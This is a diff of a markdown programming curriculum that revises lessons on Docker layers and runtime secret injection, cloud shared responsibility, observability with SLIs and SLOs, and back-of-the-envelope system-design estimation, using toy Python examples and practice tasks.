-- Overview: [Docker explained (The Coding Sloth)](https://www.youtube.com/watch?v=DQdB7wFEygo) *(Composio YouTube)*
-- Secrets vs env: [What is Secrets Management? (IBM Technology)](https://www.youtube.com/watch?v=iETENR5MEB8) *(Composio YouTube)*; [Hiding secrets in env vars (Corey Schafer)](https://www.youtube.com/watch?v=IolxqkL7cD8) *(Composio YouTube)* - local habit, not a vault
-- Hands-on: [prakhar1989/docker-curriculum](https://github.com/prakhar1989/docker-curriculum) *(Composio GitHub)*
-- Written: Docker docs "Get Started"; twelve-factor config/port binding habits from [12factor.net](https://12factor.net/) *(Composio fetch)*
-
-**STEP-BY-STEP EXPLANATION**
+**CORE VOCABULARY:**
 
 | Concept | What it is |
 | ------- | ---------- |
-| **Image** | Immutable filesystem snapshot + metadata (entrypoint, env defaults) |
-| **Container** | A running (or stopped) instance of an image - process isolation + namespaces |
-| **Dockerfile** | Recipe of layers: base OS/runtime → copy code → install deps → set command |
-| **Registry** | Where images are stored and pulled (Docker Hub, GHCR, private) |
+| **Image** | Immutable filesystem snapshot + metadata (entrypoint, default env) |
+| **Container** | Running (or stopped) instance — process isolation + namespaces |
+| **Dockerfile** | Recipe of **layers**: base → deps → code → command |
+| **Registry** | Where images are stored/pulled (GHCR, Docker Hub, private) |
 
-**Env vars vs secrets (do not blur them):**
+**LAYERS AND CACHE:**
+
+Each Dockerfile instruction typically adds a layer. Changing an early layer invalidates every later cache — so copy dependency manifests *before* application code so code edits do not reinstall the world.
+
+```text
+FROM python:3.12-slim          # layer 0 base
+COPY requirements.txt .        # layer 1 deps-meta  ← change rarely
+RUN pip install -r ...         # layer 2 deps
+COPY app.py .                  # layer 3 app        ← change often
+CMD ["python", "app.py"]       # layer 4 cmd
+
+Edit app.py  → rebuild layers 3–4 only (CACHE on 0–2)
+Edit requirements.txt → rebuild from layer 1 onward
+```
+
+**CONFIG VS SECRETS (DO NOT BLUR):**
 
 | | Environment variables | Secrets |
 | - | --------------------- | ------- |
-| **Purpose** | Non-sensitive config (`PORT`, `LOG_LEVEL`, feature flags) | Credentials (`DB_PASSWORD`, API keys, private keys) |
+| **Purpose** | Non-sensitive config (`PORT`, `LOG_LEVEL`, feature flags) | Credentials (`DB_PASSWORD`, API keys) |
 | **OK in image?** | Defaults sometimes | **Never** bake into layers or `ENV` in Dockerfile |
-| **Where they live** | Process environment / orchestrator config | Secret store / CI secret injector / sealed volume |
-| **Leak risk** | Often appear in crash dumps and `docker inspect` | Same - treat as sensitive; rotate when exposed |
+| **Where they live** | Process env / orchestrator config | Secret store / CI injector / sealed volume |
+| **Leak risk** | Crash dumps, `docker inspect` | Same — rotate when exposed |
 
-Twelve-factor "store config in the environment" is about *injecting at runtime*, not about committing `.env` files with production passwords to Git. Local `.env` (gitignored) is a convenience; production uses a secrets manager or platform secret.
+Twelve-factor “store config in the environment” means *inject at runtime*, not commit production passwords in `.env` to Git. Local gitignored `.env` is a convenience; production uses a secrets manager or platform secret. Phase 77’s “promote the same artifact” depends on this: one image, many environments, different runtime injections.
 
 ```text
 Host OS
   └─ container runtime
        └─ your process (only what the image installed)
-Networks/volumes attach storage and ports without baking secrets into the image.
+Networks/volumes attach storage and ports.
 Runtime injects: PORT=8080 (config) + DB_PASSWORD from secret store.
 ```
 
-**SMALL WORKING EXAMPLE**
+```dockerfile
+# Good shape (secrets NOT present)
+FROM python:3.12-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY app.py .
+ENV PORT=8080
+CMD ["python", "app.py"]
+# DB_PASSWORD comes from orchestrator/CI at `docker run -e` / secret mount
+```
 
 ```python playground=cs-phase-78-image-layers
 # Model a tiny "Dockerfile" as ordered layers. Changing an early layer
-# invalidates everything after it (cache bust) - same idea as real Docker.
+# invalidates everything after it (cache bust) — same idea as real Docker.
 
 layers = [
     ("FROM python:3.12-slim", "base"),
@@ -17053,22 +13538,23 @@ def rebuild_from(change_index):
 rebuild_from(3)  # only app + cmd rebuild
 rebuild_from(1)  # deps onward rebuild
 
-# Secrets must NOT be Dockerfile ENV layers:
-bad = 'ENV DB_PASSWORD=supersecret'   # baked into image history forever
-good = 'runtime inject from secret store / orchestrator'
+bad = "ENV DB_PASSWORD=supersecret"  # baked into image history forever
+good = "runtime inject from secret store / orchestrator"
 print("bad:", bad)
 print("good:", good)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Define image vs container; give one example of config vs secret |
-| Medium | Write a 6-line Dockerfile for a hello HTTP server; explain layer order and where the DB password comes from |
-| Hard | Containerize a Phase 75-style service and run it with a mapped port - password via runtime env, not the image |
+| Medium | Write a short Dockerfile for a hello HTTP server; explain layer order and where the DB password comes from |
+| Hard | Containerize a Phase 75-style service with a mapped port — password via runtime env, not the image; argue why CI must promote one digest |
 
-**WHY THE NEXT TOPIC IS NEEDED - Cloud Fundamentals:** Containers still need somewhere to run - VMs, managed container services, object storage, load balancers. Cloud is "someone else's computer" as productized building blocks. That is Phase 79.
+**WHAT THIS UNLOCKS NEXT:**
+
+Containers still need somewhere to run — VMs, managed container services, object storage, load balancers. Cloud is “someone else’s computer” as productized building blocks. That is Phase 79 — not full Kubernetes or distributed Story XI.
 
 ---
 
@@ -17076,49 +13562,60 @@ print("good:", good)
 
 ---
 
-
-
 # PHASE 79 - Cloud Fundamentals
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain cloud building blocks - compute, storage, and networking - and map IaaS / PaaS / SaaS to who manages which layer.
+**WHAT YOU WILL BE ABLE TO DO:** Explain cloud building blocks — compute, storage, and networking — and map IaaS / PaaS / SaaS to who manages which layer.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 78 (containers are one compute packaging), Phase 55-59 (networks still apply; the cloud does not erase packets and DNS), Phase 60-65 (managed databases are still databases with the same consistency trade-offs).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 78 — containers are one compute packaging. Phases 55–59 — networks still apply; the cloud does not erase packets and DNS. Phases 60–65 — managed databases are still databases with the same consistency trade-offs.
+
+**LEARNING RESOURCES:**
+
+- [IaaS vs PaaS vs SaaS (Google Cloud)](https://cloud.google.com/learn/paas-vs-iaas-vs-saas)
+- [Cloud Computing fundamentals (Great Learning)](https://www.youtube.com/watch?v=UH6qCty0nF4)
+- [AWS shared responsibility model](https://aws.amazon.com/compliance/shared-responsibility-model/) — read the diagram; ideas transfer across vendors
+- Skim one provider’s free-tier docs for compute + object storage + VPC
 
 ## 79.1 Someone Else's Computer, Productized
 
-**WHY YOU ARE LEARNING THIS:** Cloud providers rent elastic capacity and managed services so you stop racking machines - but you still choose compute, storage, and network shapes. Wrong choices look like "the cloud is slow" when the real issue is chatty cross-AZ traffic or a tiny instance.
+An image from Phase 78 still needs a machine, a disk, a network path, and an identity policy. Cloud providers rent elastic capacity and managed services so you stop racking hardware — but you still choose shapes. Wrong choices look like “the cloud is slow” when the real issue is chatty cross-AZ traffic or a tiny instance. This phase is **fundamentals**, not Kubernetes or the full distributed design Story XI owns.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**SHARED RESPONSIBILITY (ACCURATE WORDING):**
 
-- Survey: [Cloud Computing fundamentals (Great Learning)](https://www.youtube.com/watch?v=UH6qCty0nF4) *(Composio YouTube)*; hybrid/observability angle [IBM Technology](https://www.youtube.com/watch?v=hLvwoow3XTk)
-- Written: [IaaS vs PaaS vs SaaS (Google Cloud)](https://cloud.google.com/learn/paas-vs-iaas-vs-saas) *(Composio web)*; skim one provider's free-tier "compute + object storage + VPC" docs
-- Practice: for an app you know, list what you would buy as VM vs managed DB vs object storage
-
-**STEP-BY-STEP EXPLANATION**
-
-**Shared responsibility (wording that stays accurate):** the cloud provider secures *of* the cloud (hardware, hypervisor, physical facilities, and often the managed control plane). You secure *in* the cloud (your guest OS on IaaS, your app code, your identity policies, your data classification, your encryption keys you choose to manage, and your network allow-lists). Moving to PaaS shifts more of the stack to the provider - it does **not** move responsibility for *your* application bugs, leaked secrets, or open S3/buckets with public ACLs.
+The provider secures *of* the cloud (hardware, hypervisor, facilities, often the managed control plane). You secure *in* the cloud (guest OS on IaaS, app code, IAM policies, data classification, keys you choose to manage, network allow-lists). Moving to PaaS shifts more of the stack to the provider — it does **not** move responsibility for *your* application bugs, leaked secrets, or public buckets.
 
 ```text
                  You manage ←――――――――――――――→ Provider manages
-IaaS (VMs):      OS patches, runtime, app, data, IAM roles    hardware, hypervisor, regions
-PaaS:            app code, data, secrets, IAM                 OS, runtime, much scaling plumbing
-SaaS:            users, config, data you enter                almost the product stack
+IaaS (VMs):      OS patches, runtime, app, data, IAM     hardware, hypervisor, regions
+PaaS:            app code, data, secrets, IAM            OS, runtime, much scaling plumbing
+SaaS:            users, config, data you enter           almost the product stack
 ```
 
-Misread to avoid: "we're on AWS so security is handled." Shared responsibility means **both** parties have jobs; the contract draws the line, it does not delete yours.
+Misread to avoid: “we’re on a big cloud so security is handled.” Shared responsibility means **both** parties have jobs.
 
-Building blocks you will keep meeting:
+**BUILDING BLOCKS YOU WILL KEEP MEETING:**
 
-1. **Compute** - VMs, containers, serverless functions.
-2. **Storage** - block (disks), object (blobs), file shares; durability ≠ backups you tested.
-3. **Networking** - VPCs, subnets, security groups/firewalls, load balancers, DNS.
-4. **Identity** - who/what may call which API (IAM) - ties to Story IX.
+| Block | Examples | Trap |
+| ----- | -------- | ---- |
+| **Compute** | VMs, containers, serverless functions | Undersized instance blamed on “cloud” |
+| **Storage** | Block disks, object blobs, file shares | Durability ≠ a backup you tested restoring |
+| **Networking** | VPC, subnets, security groups, LB, DNS | Cross-AZ chatter bills and latency |
+| **Identity** | IAM who/what may call which API | Over-broad roles (ties to Story IX) |
 
-Trade-offs: managed services buy speed and ops relief; they cost money and create vendor-shaped constraints. Design for *portability of ideas* (12-factor) even when you embrace a managed DB.
+```text
+Bookstore sketch (vendor-neutral):
 
-**SMALL WORKING EXAMPLE**
+  DNS + load balancer
+        │
+   web container(s)  ── object storage (cover images)
+        │
+   api container(s)  ── managed relational DB (orders)
+        │
+   managed cache (sessions)     secrets from vault / platform store
+```
+
+Managed services buy speed and ops relief; they cost money and create vendor-shaped constraints. Design for *portability of ideas* (twelve-factor: config, logs, disposability) even when you embrace a managed DB. Full multi-region failover, consensus, and CAP trade-offs wait for Story XI — here you need to know which *layer* you bought and which risks remain yours.
 
 ```python playground=cs-phase-79-cloud-map
 # Map a toy app to cloud building blocks (no vendor lock-in in the sketch).
@@ -17135,19 +13632,22 @@ app = {
 for component, block in app.items():
     print(f"{component:12} → {block}")
 
-# Responsibility check
 print("\nIf PaaS for web: you still own app code, secrets, and data correctness.")
+print("IaaS VM: you also own OS patches and runtime upgrades.")
+print("SaaS email: you own who may send and what PII goes in the body.")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | Define IaaS, PaaS, SaaS with one example each |
-| Medium | Draw compute/storage/network for a photo-sharing toy app |
-| Hard | Argue when a managed database is worth the lock-in for a student project |
+| Easy | Define IaaS, PaaS, SaaS with one example each; state one responsibility that remains yours on PaaS |
+| Medium | Draw compute/storage/network/IAM for a photo-sharing toy app |
+| Hard | Argue when a managed database is worth the lock-in for a student project vs a self-hosted container |
 
-**WHY THE NEXT TOPIC IS NEEDED - Observability:** Once software runs on machines you do not sit next to, "print debugging" stops working. You need logs, metrics, and traces to see what production is actually doing. That is Phase 80.
+**WHAT THIS UNLOCKS NEXT:**
+
+Once software runs on machines you do not sit next to, “print debugging” stops working. You need logs, metrics, and traces — and SLI/SLO language — to see what production is actually doing. That is Phase 80.
 
 ---
 
@@ -17155,47 +13655,65 @@ print("\nIf PaaS for web: you still own app code, secrets, and data correctness.
 
 ---
 
-
-
 # PHASE 80 - Observability & Production Debugging
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Use the three pillars - logs, metrics, and traces - to form a hypothesis about a live problem and say what signal would confirm or kill it.
+**WHAT YOU WILL BE ABLE TO DO:** Use the three pillars — logs, metrics, and traces — to form a hypothesis about a live problem and say what signal would confirm or kill it; define a simple SLI/SLO pair.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 77-79 (you can ship to somewhere not-your-laptop), Phase 55-59 (latency and partial failure are network facts), Phase 74 (tests catch regressions before prod; observability catches what tests never saw).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 77–79 — you can ship to somewhere not-your-laptop. Phases 55–59 — latency and partial failure are network facts. Phase 74 — tests catch regressions before prod; observability catches what tests never saw.
+
+**LEARNING RESOURCES:**
+
+- [Metrics, Logs and Traces: What To Observe and Why](https://www.youtube.com/watch?v=aJpzr8648XE)
+- [Observability primer (OpenTelemetry)](https://opentelemetry.io/docs/concepts/observability-primer/)
+- [What is OpenTelemetry? (Better Stack)](https://www.youtube.com/watch?v=LzLULxhyIpU)
+- [Google SRE book — SLIs, SLOs, SLAs](https://sre.google/sre-book/service-level-objectives/) (definitions)
 
 ## 80.1 See What Is Actually Happening
 
-**WHY YOU ARE LEARNING THIS:** Production fails in ways unit tests never invent - bad deploys, dependency slowdowns, rare race conditions, capacity cliffs. Observability is the ability to ask new questions of a running system without shipping new code for every question. The usual trio: **logs** (events), **metrics** (aggregates over time), **traces** (one request across services).
+Story X taught you to collaborate, specify, test, structure, gate work, automate the path to production, package once, and host on shared infrastructure. Production still fails in ways unit tests never invent — bad deploys, dependency slowdowns, rare races, capacity cliffs. Observability is the ability to ask new questions of a running system without shipping new code for every question.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Primer: [Metrics, Logs and Traces: What To Observe and Why](https://www.youtube.com/watch?v=aJpzr8648XE) *(Composio YouTube)*; [What is OpenTelemetry? (Better Stack)](https://www.youtube.com/watch?v=LzLULxhyIpU) *(Composio YouTube)*
-- Written: [Observability primer (OpenTelemetry)](https://opentelemetry.io/docs/concepts/observability-primer/) *(Composio fetch)*; Google SRE book chapters on SLIs/SLOs (skim definitions only)
-- Practice: add structured logs to a tiny service, then invent three metrics you would graph
-
-**STEP-BY-STEP EXPLANATION**
+**THREE PILLARS:**
 
 | Signal | Good for | Weak at |
 | ------ | -------- | ------- |
-| **Logs** | Exact errors, audit trail, "what happened to request X" | High cardinality noise; hard to aggregate alone |
+| **Logs** | Exact errors, audit trail, “what happened to request X” | High-cardinality noise; hard to aggregate alone |
 | **Metrics** | Rates, saturation, SLI time series | Often lose per-user detail |
-| **Traces** | Where time went across services (spans linked by a trace id) | Need context propagation; sampling trade-offs |
+| **Traces** | Where time went across services (spans + trace id) | Need context propagation; sampling trade-offs |
 
-**SLI / SLO (light, not a full SRE course):**
+```text
+Request abc123
+  ├─ api.handle_checkout          920ms
+  │    ├─ domain.calculate_total    2ms
+  │    ├─ db.insert_order          40ms
+  │    └─ payments.charge         850ms   ← culprit span
+  └─ log: "timeout talking to payments"  trace=abc123
+metric: http_p95_ms = 900 (was 120)
+```
 
-- **SLI** (Service Level Indicator) - a *measurement* of user-visible goodness (e.g. "fraction of HTTP requests faster than 300 ms", "successful checkouts / attempted checkouts").
-- **SLO** (Service Level Objective) - a *target* on that SLI over a window (e.g. "99.9% of requests < 300 ms over 30 days").
-- **SLA** - a *business/legal* contract that may use SLOs; usually outside beginner scope.
+Correlate with a **request id / trace id**. Prefer structured logs (JSON fields) over free prose. Never paste secrets into logs.
 
-Pick SLIs from user journeys, not from "CPU is high." Metrics power SLOs; logs/traces explain *why* an SLO is burning.
+**SLI / SLO / SLA (LIGHT):**
 
-**Production debugging loop:** (1) symptom → (2) which signal moved → (3) narrow blast radius → (4) confirm with a trace or log field → (5) fix + regression test (Phase 74) → (6) alert so it cannot silently return.
+| Term | Meaning | Example |
+| ---- | ------- | ------- |
+| **SLI** | Measurement of user-visible goodness | Fraction of HTTP requests < 300 ms; successful checkouts / attempts |
+| **SLO** | Target on an SLI over a window | 99.9% of requests < 300 ms over 30 days |
+| **SLA** | Business/legal contract (often uses SLOs) | Outside beginner scope — know it exists |
 
-Never paste secrets into logs. Correlate with a **request id** / **trace id**. Prefer structured logs (JSON fields) over free prose.
+Pick SLIs from **user journeys**, not from “CPU is high.” Metrics power SLOs; logs and traces explain *why* an error budget is burning. Canary deploys in Phase 77 only work if these signals exist.
 
-**SMALL WORKING EXAMPLE**
+**PRODUCTION DEBUG LOOP:**
+
+```text
+1 Symptom (checkout slow / error spike)
+2 Which signal moved? (p95, error rate, saturation)
+3 Narrow blast radius (one region? one dependency? one deploy SHA?)
+4 Confirm with a trace or log field
+5 Fix + regression test (Phase 74)
+6 Alert so it cannot silently return
+```
 
 ```python playground=cs-phase-80-debug-signals
 # Toy "incident": p95 latency jumped. Which signal supports which hypothesis?
@@ -17219,15 +13737,28 @@ for e in events:
     print(e)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**BOOKSTORE SLI SKETCH:**
+
+```text
+Journey: complete paid checkout
+SLI:     success_rate = paid_orders / checkout_attempts
+SLO:     99.5% over 30 days rolling
+Burn:    success_rate drops after deploy :a1b2 → check canary metrics,
+         then trace slow spans, then logs for payment timeouts
+Alert:   page when burn rate would exhaust monthly error budget in 2 hours
+```
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Define logs vs metrics vs traces in one line each; define SLI vs SLO in one line each |
-| Medium | Given "checkout is slow," list two metrics and one trace question you would check first |
-| Hard | Sketch an OpenTelemetry-style instrumentation plan for a 2-service app; name one SLI you would chart |
+| Medium | Given “checkout is slow,” list two metrics and one trace question you would check first |
+| Hard | Sketch an OpenTelemetry-style plan for a 2-service app; name one SLI/SLO pair and what alert fires when the SLO burns |
 
-**WHY THE NEXT TOPIC IS NEEDED - System Design:** You can now collaborate, specify, test, structure, process, automate, package, host, and observe software. The next story asks what changes when *one machine is not enough* - load, caches, queues, and distributed failure. That is Story XI, starting at Phase 81.
+**WHAT THIS UNLOCKS NEXT:**
+
+Story X made you able to **ship with teammates safely**: shared history and review, buildable specs, automated proof, domain-centered architecture, visible process gates, CI/CD, containers with runtime secrets, cloud shared responsibility, and production signals with SLIs/SLOs. That toolkit still assumes *one coherent system you can reason about as a unit*. The next limit is load, partial failure, and multiple machines — when one server is no longer enough. System design foundations open Story XI at Phase 81: clarify, estimate, draw the simplest shape, and name which later lever (scale, cache, queue, consensus, reliability) you reach for when the numbers force it.
 
 ---
 
@@ -17235,39 +13766,48 @@ for e in events:
 
 ---
 
-
 # PHASE 81 - System Design Foundations
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Approach a system-design problem the way an interview or design review expects - clarify requirements, do back-of-the-envelope estimation, draw the simplest shape that could work, and name which later phase owns each scaling lever.
+**WHAT YOU WILL BE ABLE TO DO:** Clarify a vague system-design prompt, run back-of-the-envelope estimates, draw the simplest shape that could work, and name which later lever (scale, cache, queue, consistency, consensus, reliability) the numbers force you to open next.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phases 72-80 (you can ship and observe software), Phases 55-65 (networks and databases already exist), Phase 68 (sessions break the moment a second app server appears).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 80 — you can ship and observe one coherent system. Phases 55–65 — networks and databases already exist. Phase 68 — sticky in-process sessions break the moment a second app server appears.
+
+**LEARNING RESOURCES:**
+
+- [How to Answer System Design Interview Questions (Exponent)](https://www.youtube.com/watch?v=L9TfZdODuFQ) — process shape, not mechanisms
+- [How to Approach Capacity Estimation (System Design Daily)](https://www.youtube.com/watch?v=L_ZwlSRIG5E)
+- [System Design Primer](https://github.com/donnemartin/system-design-primer) — reference atlas; Phases 82–87 own the depth
+- [Excalidraw](https://excalidraw.com/) — diagram + timer practice
 
 ## 81.1 How to Think About System Design
 
-**WHY YOU ARE LEARNING THIS:** Stories I–X taught components. System design is the skill of *selecting* components under load, failure, and incomplete requirements. Phase 81 teaches the *process and map*. Phases 82–87 own the mechanisms (bottlenecks, caching, queues, CAP, consensus, reliability). Phase 88 is the learning capstone that walks a full design; Story XV applies the same skill under interview pressure.
+Story X left you able to ship and observe a system you can still reason about as a unit. The next limit is not “write better code.” It is load, partial failure, and more than one machine — when one coherent box stops being enough. System design is the skill of *selecting* components under incomplete requirements. This phase owns the **process and the map**. Phases 82–87 own the mechanisms. Phase 88 is the learning walkthrough that combines them; Story XV / Phase 103 applies the same skill under interview pressure.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**THE SIX MOVES (REHEARSE EVERY TIME):**
 
-- Process: [How to Answer System Design Interview Questions (Exponent)](https://www.youtube.com/watch?v=L9TfZdODuFQ) *(Composio YouTube)*; [How to Approach Capacity Estimation (System Design Daily)](https://www.youtube.com/watch?v=L_ZwlSRIG5E) *(Composio YouTube)*
-- Map overview: [Scalability Simply Explained (ByteByteGo)](https://www.youtube.com/watch?v=EWS_CIxttVw) *(Composio YouTube)* - stage progression; treat deep caching/async as previews of Phases 83–84, not the homework of this phase
-- Alternative: [System Design Basics (Gaurav Sen)](https://www.youtube.com/watch?v=xpDnVSmNFX0) *(Composio YouTube)*
-- Written: [System Design Primer](https://github.com/donnemartin/system-design-primer) *(Composio GitHub)* - reference atlas, not a substitute for 82–87
-- Practice medium: [Excalidraw](https://excalidraw.com/) + a timer; prefer diagrams and arithmetic over premature code
+1. **Clarify** — functional requirements, explicit non-goals, users, read:write ratio, latency, availability, consistency needs. A vague prompt is a trap; narrowing it is the first graded skill.
+2. **Estimate** — average and peak RPS, storage per year, bandwidth, working-set size. Numbers license every later choice — including *not* sharding.
+3. **API + data sketch** — endpoints and primary tables/keys (Phases 59–65). Access patterns surface here before boxes do.
+4. **Simplest design** — one box, or app + DB. Do not draw nine boxes first.
+5. **Walk bottlenecks** — what breaks first; which phase owns the fix.
+6. **Trade-offs + failure** — every stage costs complexity; name the cost and the new failure mode.
 
-**STEP-BY-STEP EXPLANATION**
+**WHY ESTIMATION IS NOT OPTIONAL:**
 
-**The process (rehearse this every time):**
+Without numbers, “we need microservices” and “one Postgres is fine” are both opinions. With numbers, they become decisions. A design review (or a good interview) rewards the candidate who can say “~200 peak writes/s → one primary; ~20k peak reads/s → cache first, not shard.” Arithmetic is how you earn the right to stay simple.
 
-1. **Clarify** - functional requirements, explicit non-goals, users, read:write, latency, availability, consistency needs.
-2. **Estimate** - average and peak RPS, storage/year, bandwidth, working-set size. Numbers license every later choice (including *not* sharding).
-3. **API + data sketch** - endpoints and primary tables/keys (Phases 59–65). Access patterns surface here.
-4. **Simplest design** - one box or app+DB. Do not draw nine boxes first.
-5. **Walk bottlenecks** - what breaks first; which phase owns the fix.
-6. **Trade-offs + failure** - every stage costs complexity; name it.
+Rough constants you will reuse:
 
-**Vertical vs horizontal (owned lightly here; depth in Phase 82):**
+```text
+Seconds per day ≈ 86_400
+Peak ≈ 2–5× average (state your assumption)
+Storage ≈ rows × bytes_per_row × retention
+Working set ≈ hot_fraction × total (often Zipfian: few keys get most reads)
+```
+
+**VERTICAL VS HORIZONTAL (NAMED HERE; DIAGNOSED IN 82):**
 
 | | Vertical | Horizontal |
 | - | -------- | ---------- |
@@ -17275,9 +13815,9 @@ for e in events:
 | Wins | Simple; no app rewrite | Near-unbounded; redundancy |
 | Costs | Finite ceiling; one failure domain | Statelessness required; shared state moves out |
 
-**Stateless app tier:** "stateless" means session/files/job state do not live *in* the app process. Fixes when you add a second server: shared session store **or** tokens (Phase 68) - preview only; Phase 82 practices bottleneck diagnosis.
+“Stateless app tier” means session files, job state, and uploads do **not** live in the app process. When you add a second server, sticky sessions fight you — shared session store or tokens (Phase 68) become necessary. Phase 82 practices finding *which* scarce resource forces that move.
 
-**Ownership map (do not re-teach these here):**
+**OWNERSHIP MAP (DO NOT RE-TEACH HERE):**
 
 ```text
 Phase 81  process + map + estimation habit
@@ -17286,11 +13826,11 @@ Phase 83  caching strategies + invalidation / stampede
 Phase 84  queues / events; at-least-once + idempotency
 Phase 85  CAP / PACELC; consistency models across machines
 Phase 86  consensus (Raft-level intuition); leader agreement
-Phase 87  timeouts, retries, circuit breakers (client-side survival)
+Phase 87  timeouts, retries, circuit breakers (caller-side survival)
 Phase 88  full walkthrough combining the toolbox
 ```
 
-**Journey map (preview only - mechanisms live later):**
+**JOURNEY MAP (PREVIEW ONLY — MECHANISMS LIVE LATER):**
 
 ```text
 1 single server          → ceiling: one box
@@ -17303,38 +13843,36 @@ Phase 88  full walkthrough combining the toolbox
 (+ async off request path → Phase 84; reliability wrappers → Phase 87)
 ```
 
-**Healthy revisit:** Phase 65 already taught replication vs partitioning vs sharding. Here you only ask *when the numbers force them*. CAP (Phase 85) is the limit those choices operate under - not something to solve with "add a cache."
+**HEALTHY REVISIT:** Phase 65 already taught replication vs partitioning vs sharding as *database ops*. Here you only ask *when the numbers force them*. CAP (Phase 85) is the limit those choices operate under — not something you solve with “add a cache.”
 
-**PICTURE IT LIKE THIS**
+Keep one running domain across Story XI: **Quarry Bookstore** (catalog, cart, checkout — from Story VIII) plus a **marketing URL shortener** the bookstore uses for campaign links. Same company; different load shapes. That reuse makes trade-offs comparable phase to phase.
 
-An architect does not start by picking marble finishes. First: how many people, what loads, what code allows, what fails in a fire. Estimation is the load calculation. The stage map is the structural system. Finishes (Redis, Kafka, Raft) come after the arithmetic says you need them - that is Phases 82–87.
-
-**Internal Working, back-of-the-envelope (the skill this phase owns)**
+**BOOKSTORE SHORT LINKS — ESTIMATION BEFORE ARCHITECTURE:**
 
 ```text
-"URL shortener: 100M new links / month"
+"URL shortener for bookstore campaigns: 100M new links / month"
 
 WRITES: 100M/30/86400 ≈ 40/s avg → ~200/s peak
   → one primary DB is fine. Do not shard yet.
 
 READS: assume 100:1 → ~4k/s avg, ~20k peak
-  → cache is mandatory (Phase 83); replicas if miss path still hot (65/82).
+  → cache becomes necessary (Phase 83); replicas if miss path still hot (65/82).
 
 STORAGE: ~260B/row → ~26 GB/month → ~1.5 TB / 5 years
   → fits one disk. Sharding is for write volume or working set, not vanity.
 
 CONCLUSION WITH NUMBERS: stages 1–5, not 6–7.
-Designing microservices unasked is the common interview failure mode.
+Designing microservices unasked is the common failure mode.
 ```
 
-**SMALL WORKING EXAMPLE**
+An architect does not start by picking marble finishes. First: how many people, what loads, what the code allows, what fails in a fire. Estimation is the load calculation. The stage map is the structural system. Finishes (Redis, Kafka, Raft) come after the arithmetic says you need them — that is Phases 82–87.
 
 ```python playground=cs-phase-81-estimate
 # Estimation habit - arithmetic first, architecture second.
 # Caching/queue code belongs in Phases 83–84; this only sizes the problem.
 
 def estimate(name, monthly_writes, read_write_ratio, bytes_per_row,
-             peak_multiplier=3, hot_fraction=0.2, years=5):
+             peak_multiplier=5, hot_fraction=0.2, years=5):
     w_avg = monthly_writes / 30 / 86_400
     w_peak = w_avg * peak_multiplier
     r_peak = w_peak * read_write_ratio
@@ -17344,28 +13882,28 @@ def estimate(name, monthly_writes, read_write_ratio, bytes_per_row,
     print(f"=== {name} ===")
     print(f"writes peak ≈ {w_peak:,.0f}/s   reads peak ≈ {r_peak:,.0f}/s")
     print(f"storage ≈ {storage_year/1e9:.1f} GB/yr; hot set ≈ {hot_bytes/1e9:.1f} GB")
-    print(f"  shard writes (>10k/s)? {'YES' if w_peak > 10_000 else 'no → Phase 82/65 later'}")
+    print(f"  shard writes (>10k/s)? {'YES' if w_peak > 10_000 else 'no → stay simple'}")
     print(f"  need cache (>5k reads/s)? {'YES → Phase 83' if r_peak > 5_000 else 'maybe later'}")
     print(f"  need async off path? ask: must user wait? (Phase 84)")
 
-estimate("URL shortener", 100_000_000, 100, 260)
-estimate("Bank ledger", 10_000_000, 10, 500)
+estimate("Bookstore URL shortener", 100_000_000, 100, 260)
+estimate("Bookstore checkout ledger", 10_000_000, 10, 500)
+estimate("Social-style activity feed", 50_000_000, 200, 400)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | List the six process steps from memory |
-| Easy | Vertical vs horizontal in one sentence each; name what "stateless app" means |
-| Medium | Estimate a chat app (state assumptions). Say which phase owns your first scaling lever |
-| Medium | Draw (Excalidraw) single-server → LB+apps → DB only - stop before inventing cache/queue detail |
-| Hard | For three prompts (shortener, feed, ledger), write which stages the *numbers* force and which phases teach them |
-| Hard | Narrate a 10-minute mock: clarify → estimate → simplest diagram → "I'd open Phase 83 next because…" |
+| Easy | Vertical vs horizontal in one sentence each; say what “stateless app” means |
+| Medium | Estimate Quarry Bookstore checkout (state your assumptions). Name which phase owns your first scaling lever |
+| Medium | Draw (Excalidraw) single-server → LB+apps → DB only — stop before inventing cache/queue detail |
+| Hard | For shortener, feed, and ledger: write which stages the *numbers* force and which phases teach them |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**WHY THE NEXT TOPIC IS NEEDED - Scaling Applications:** A journey map is not a diagnosis. Under load you must name the scarce resource (CPU, disk, lock, network) and pick the move that multiplies *that* resource. That is Phase 82.
+A journey map is not a diagnosis. Under load you must name the scarce resource — CPU, disk, lock, network — and pick the move that multiplies *that* resource. Scaling without a bottleneck is cargo-cult architecture. That diagnosis habit is Phase 82.
 
 ---
 
@@ -17373,77 +13911,117 @@ estimate("Bank ledger", 10_000_000, 10, 500)
 
 ---
 
-
-
 # PHASE 82 - Scaling Applications
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Identify a concrete bottleneck (CPU, memory, disk, network, or lock) under load and name the scaling move that removes *that* bottleneck - not a generic "add servers" answer.
